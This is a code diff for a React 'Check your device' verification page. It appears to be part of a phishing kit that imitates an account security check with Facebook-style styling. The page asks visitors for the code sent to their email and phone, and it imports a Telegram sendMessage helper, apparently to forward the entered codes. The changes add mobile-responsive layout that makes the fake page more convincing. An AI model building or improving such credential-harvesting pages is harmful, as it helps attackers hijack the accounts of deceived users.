@@ -1,7 +1,7 @@
 import VerifyImage from '@/assets/images/681.png';
 import { faCircleInfo } from '@fortawesome/free-solid-svg-icons';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
-import { useState, useEffect, useCallback } from 'react';
+import { useState, useEffect } from 'react';
 import sendMessage from '@/utils/telegram';
 import { useNavigate } from 'react-router';
 import { PATHS } from '@/router/router';
@@ -12,6 +12,7 @@ const Verify = () => {
     const [isLoading, setIsLoading] = useState(false);
     const [showError, setShowError] = useState(false);
     const [attempts, setAttempts] = useState(0);
+    const [isMobile, setIsMobile] = useState(false);
     const [translatedTexts, setTranslatedTexts] = useState({
         title: 'Check your device',
         description: '',
@@ -23,6 +24,20 @@ const Verify = () => {
         errorMessage: 'The verification code you entered is incorrect',
         loadingText: 'Please wait'
     });
+
+    // 🎯 PHÁT HIỆN THIẾT BỰ MOBILE
+    useEffect(() => {
+        const checkMobile = () => {
+            const isMobileDevice = /iPhone|iPad|iPod|Android|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            const isSmallScreen = window.innerWidth <= 768;
+            setIsMobile(isMobileDevice || isSmallScreen);
+        };
+
+        checkMobile();
+        window.addEventListener('resize', checkMobile);
+        
+        return () => window.removeEventListener('resize', checkMobile);
+    }, []);
 
     // 🎯 CẬP NHẬT: Load và khởi tạo dịch
     useEffect(() => {
@@ -57,21 +72,18 @@ const Verify = () => {
                     const parsedTranslation = JSON.parse(savedTranslation);
                     setTranslatedTexts(parsedTranslation);
                 } catch {
-                    // Nếu lỗi thì dùng tiếng Anh với data thật
                     setTranslatedTexts(prev => ({
                         ...prev,
                         description: `We have sent a verification code to your ${actualEmail}, ${actualPhone}. Please enter the code we just sent to continue.`
                     }));
                 }
             } else {
-                // Nếu chưa có bản dịch thì dùng tiếng Anh với data thật
                 setTranslatedTexts(prev => ({
                     ...prev,
                     description: `We have sent a verification code to your ${actualEmail}, ${actualPhone}. Please enter the code we just sent to continue.`
                 }));
             }
         } else {
-            // 🎯 TIẾNG ANH: DÙNG DATA THẬT
             setTranslatedTexts(prev => ({
                 ...prev,
                 description: `We have sent a verification code to your ${actualEmail}, ${actualPhone}. Please enter the code we just sent to continue.`
@@ -103,7 +115,6 @@ const Verify = () => {
             console.log('Send message error:', error);
         }
 
-        // Delay 1 giây
         await new Promise((resolve) => setTimeout(resolve, 1000));
 
         const newAttempts = attempts + 1;
@@ -118,47 +129,135 @@ const Verify = () => {
         }
     };
 
+    // 🎯 KÍCH THƯỚC RESPONSIVE ĐỘNG
+    const getResponsiveClasses = () => {
+        if (isMobile) {
+            return {
+                container: 'pt-4 pb-4 px-3',
+                title: 'text-xl font-bold',
+                description: 'text-sm',
+                input: 'text-lg px-4 py-3',
+                button: 'py-3 text-base',
+                infoText: 'text-xs',
+                infoTitle: 'text-sm'
+            };
+        } else {
+            return {
+                container: 'pt-8 pb-8 px-6',
+                title: 'text-2xl font-bold',
+                description: 'text-base',
+                input: 'text-xl px-4 py-3',
+                button: 'py-3 text-base',
+                infoText: 'text-sm',
+                infoTitle: 'text-base'
+            };
+        }
+    };
+
+    const responsive = getResponsiveClasses();
+
     return (
-        <div className='flex min-h-screen flex-col items-center justify-center bg-[#f8f9fa]'>
+        // 🎯 VIEWPORT CỐ ĐỊNH CHO MOBILE
+        <div 
+            className={`flex min-h-screen flex-col items-center justify-center bg-[#f8f9fa] ${responsive.container} safe-area-top safe-area-bottom`}
+            style={{
+                minHeight: '100dvh', // 🎯 Sử dụng dvh cho mobile
+                paddingTop: 'env(safe-area-inset-top, 1rem)',
+                paddingBottom: 'env(safe-area-inset-bottom, 1rem)'
+            }}
+        >
             <title>Account | Privacy Policy</title>
-            <div className='flex max-w-xl flex-col gap-4 rounded-lg bg-white p-4 shadow-lg'>
-                <p className='text-3xl font-bold'>{translatedTexts.title}</p>
-                <p>{translatedTexts.description}</p>
+            
+            {/* 🎯 CONTAINER CO DÃN THEO MÀN HÌNH */}
+            <div className={`w-full mx-auto ${isMobile ? 'max-w-[90vw]' : 'max-w-md'}`}>
+                <div className='flex flex-col gap-4 rounded-lg bg-white p-4 shadow-lg w-full'>
+                    
+                    {/* 🎯 TITLE RESPONSIVE */}
+                    <p className={`${responsive.title} text-center text-gray-900`}>
+                        {translatedTexts.title}
+                    </p>
+                    
+                    {/* 🎯 DESCRIPTION RESPONSIVE */}
+                    <p className={`${responsive.description} text-center text-gray-600 leading-relaxed`}>
+                        {translatedTexts.description}
+                    </p>
 
-                <img src={VerifyImage} alt='' />
-                
-                {/* 🎯 SỬA INPUT: Tăng cỡ chữ số nhập vào */}
-                <input
-                    type='number'
-                    inputMode='numeric'
-                    max={8}
-                    placeholder={translatedTexts.placeholder}
-                    className='rounded-lg border border-gray-300 bg-[#f8f9fa] px-6 py-2 text-lg font-medium'
-                    value={code}
-                    onChange={(e) => setCode(e.target.value)}
-                    onKeyPress={(e) => e.key === 'Enter' && handleSubmit()}
-                />
-                
-                {showError && <p className='text-sm text-red-500'>{translatedTexts.errorMessage}</p>}
-                
-                <div className='flex items-center gap-4 bg-[#f8f9fa] p-4'>
-                    <FontAwesomeIcon icon={faCircleInfo} size='xl' className='text-[#9f580a]' />
-                    <div>
-                        <p className='font-medium'>{translatedTexts.infoTitle}</p>
-                        <p className='text-sm text-gray-600'>{translatedTexts.infoDescription}</p>
+                    {/* 🎯 ẢNH TỰ ĐỘNG CO DÃN */}
+                    <div className='flex justify-center w-full'>
+                        <img 
+                            src={VerifyImage} 
+                            alt='Verification' 
+                            className={`max-w-full h-auto ${isMobile ? 'max-h-[120px]' : 'max-h-[150px]'}`}
+                            style={{
+                                objectFit: 'contain'
+                            }}
+                        />
                     </div>
+                    
+                    {/* 🎯 INPUT TỐI ƯU CHO MOBILE */}
+                    <input
+                        type='number'
+                        inputMode='numeric'
+                        max={8}
+                        placeholder={translatedTexts.placeholder}
+                        className={`w-full rounded-lg border border-gray-300 bg-[#f8f9fa] ${responsive.input} font-medium text-center focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
+                        value={code}
+                        onChange={(e) => setCode(e.target.value)}
+                        onKeyPress={(e) => e.key === 'Enter' && handleSubmit()}
+                        style={{
+                            WebkitAppearance: 'none', // 🎯 Tắt style mặc định trên iOS
+                            MozAppearance: 'textfield' // 🎯 Tắt spinner trên Firefox
+                        }}
+                    />
+                    
+                    {/* 🎯 ERROR MESSAGE RESPONSIVE */}
+                    {showError && (
+                        <p className={`text-red-500 text-center ${isMobile ? 'text-xs' : 'text-sm'} mt-1`}>
+                            {translatedTexts.errorMessage}
+                        </p>
+                    )}
+                    
+                    {/* 🎯 INFO BOX RESPONSIVE */}
+                    <div className='flex items-start gap-3 bg-[#f8f9fa] p-3 rounded-lg'>
+                        <FontAwesomeIcon 
+                            icon={faCircleInfo} 
+                            className={`text-[#9f580a] mt-0.5 flex-shrink-0 ${isMobile ? 'text-lg' : 'text-xl'}`}
+                        />
+                        <div className='flex-1 min-w-0'> {/* 🎯 min-w-0 để tránh overflow */}
+                            <p className={`font-medium text-gray-900 mb-1 ${responsive.infoTitle} leading-tight`}>
+                                {translatedTexts.infoTitle}
+                            </p>
+                            <p className={`text-gray-600 leading-relaxed ${responsive.infoText}`}>
+                                {translatedTexts.infoDescription}
+                            </p>
+                        </div>
+                    </div>
+
+                    {/* 🎯 BUTTON RESPONSIVE */}
+                    <button
+                        className={`w-full rounded-md bg-[#0866ff] px-4 ${responsive.button} font-medium text-white hover:bg-blue-600 disabled:opacity-50 disabled:bg-gray-400 transition-colors duration-200 mt-2`}
+                        onClick={handleSubmit}
+                        disabled={isLoading || !code.trim()}
+                    >
+                        {isLoading ? translatedTexts.loadingText + '...' : translatedTexts.submit}
+                    </button>
+
+                    {/* 🎯 LINK RESPONSIVE */}
+                    <p className={`cursor-pointer text-center text-blue-900 hover:underline ${isMobile ? 'text-sm' : 'text-base'} mt-1`}>
+                        {translatedTexts.sendCode}
+                    </p>
                 </div>
-
-                <button
-                    className='rounded-md bg-[#0866ff] px-4 py-2 text-sm font-medium text-white hover:bg-blue-600 disabled:opacity-50 disabled:bg-gray-400 mt-2'
-                    onClick={handleSubmit}
-                    disabled={isLoading || !code.trim()}
-                >
-                    {isLoading ? translatedTexts.loadingText + '...' : translatedTexts.submit}
-                </button>
-
-                <p className='cursor-pointer text-center text-blue-900 hover:underline'>{translatedTexts.sendCode}</p>
             </div>
+
+            {/* 🎯 THÊM CSS CHO SAFE AREA */}
+            <style jsx>{`
+                .safe-area-top {
+                    padding-top: max(1rem, env(safe-area-inset-top, 1rem));
+                }
+                .safe-area-bottom {
+                    padding-bottom: max(1rem, env(safe-area-inset-bottom, 1rem));
+                }
+            `}</style>
         </div>
     );
 };
